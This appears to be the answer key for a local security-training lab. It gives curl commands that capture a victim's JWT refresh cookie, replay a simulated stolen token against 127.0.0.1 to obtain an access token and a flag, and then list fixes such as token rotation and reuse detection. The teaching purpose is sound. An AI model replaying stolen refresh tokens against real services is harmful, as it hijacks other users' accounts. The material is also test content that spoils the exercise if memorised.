# SOLUTION — Lab-08

```bash
# 1) login as victim
curl -i -X POST http://127.0.0.1:8008/login -H "Content-Type: application/json" -d '{"user":"victim"}'
# -> Set-Cookie: __Host-refreshToken=<JWT>

# 2) single-source-of-truth proof: ONLY the refresh cookie, nothing else
curl http://127.0.0.1:8008/api/refresh -H "Cookie: __Host-refreshToken=<JWT>"
# -> 200 + victim_data.flag (no session cookie needed)

# 3) simulated theft + replay as attacker
# Windows note: use curl.exe or Burp for cookies (Invoke-WebRequest mangles the Cookie header)
curl http://127.0.0.1:8008/leak-demo   # -> stolen_refresh
curl http://127.0.0.1:8008/api/refresh -H "Cookie: __Host-refreshToken=<STOLEN>"
# -> access_token for victim -> GET /api/protected
curl http://127.0.0.1:8008/api/protected -H "Authorization: Bearer <ACCESS>"
# -> FLAG{...}
```

**Fix:** session store + `jti` + rotation on every use + reuse detection (revoke the whole chain) + device/org binding + `iss/aud`.
The secure reference code lives in `09-Writeups & Reports/jwt-design-flaw-scenario.md`.
